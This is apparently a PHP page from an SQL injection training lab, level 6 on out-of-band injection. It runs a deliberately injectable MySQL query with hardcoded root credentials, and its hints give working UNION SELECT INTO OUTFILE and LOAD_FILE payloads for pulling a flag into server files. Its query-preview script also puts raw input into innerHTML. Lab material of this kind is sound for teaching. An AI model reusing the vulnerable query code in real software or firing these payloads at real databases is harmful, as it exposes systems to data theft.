<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 6 - Out-of-Band SQLi</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 Level 6 - Out-of-Band Injection</h1>
            <p><strong>Attack Type:</strong> Use file system operations to extract data when direct output is not available</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE username = '<?php echo htmlspecialchars($_GET['cond'] ?? 'NULL'); ?>'</div>
            
            <?php
            if (isset($_GET['cond'])) {
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                
                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                $cond = $_GET['cond'];
                $sql = "SELECT username FROM users WHERE username = '$cond'";
                if (!$mysqli->query($sql)) {
                    echo '<div class="error">Error: '.$mysqli->error.'</div>';
                } else {
                    echo '✅ Query executed successfully. If you used SELECT ... INTO OUTFILE, check the mysql-files directory.';
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Own Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="cond">Username Condition:</label>
                    <input type="text" id="cond" name="cond" value="<?php echo htmlspecialchars($_GET['cond'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Out-of-Band Injection</h4>
                    <p>Out-of-band injection is used when we can't see the query results directly in the web response.</p>
                    <p>We need to use alternative methods to extract data, such as writing to files or making network requests.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Using INTO OUTFILE</h4>
                    <p>MySQL's INTO OUTFILE clause allows us to write query results to a file on the server.</p>
                    <p>Try: <code>alice' UNION SELECT 'test' INTO OUTFILE '/var/lib/mysql-files/test.txt'--</code></p>
                    <p>This writes the word 'test' to a file.</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Extracting Database Information</h4>
                    <p>We can extract database information and write it to files.</p>
                    <p>Try: <code>alice' UNION SELECT DATABASE() INTO OUTFILE '/var/lib/mysql-files/db_name.txt'--</code></p>
                    <p>This writes the current database name to a file.</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Targeting the Flag</h4>
                    <p>Now let's extract the flag from the levels table and write it to a file.</p>
                    <p>Try: <code>alice' UNION SELECT flag FROM levels WHERE id=6 INTO OUTFILE '/var/lib/mysql-files/flag6.txt'--</code></p>
                    <p>This should write the flag to a file that we can access.</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload - Complete Solution</h4>
                    <p>Here's the complete payload to extract the level 6 flag:</p>
                    <p><code>alice' UNION SELECT flag FROM levels WHERE id=6 INTO OUTFILE '/var/lib/mysql-files/level6_flag.txt'--</code></p>
                    <p>Alternative method using LOAD_FILE (if file reading is enabled):</p>
                    <p><code>alice' UNION SELECT LOAD_FILE('/var/lib/mysql-files/level6_flag.txt')--</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level5.php">⬅️ Previous Level</a>
            <a href="level7_set.php">➡️ Next Level</a>
            <a href="submit.php?level=6">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('cond').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = "SELECT username FROM users WHERE username = '" + (input || 'NULL') + "'";
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>

    <style>
    .hint-container {
        margin: 20px 0;
    }
    .hint-box {
        margin: 15px 0;
        padding: 15px;
        background: #f8f9fa;
        border-radius: 8px;
        border-left: 4px solid #6c757d;
    }
    .hint-btn {
        margin-bottom: 10px;
    }
    </style>
</body>
</html>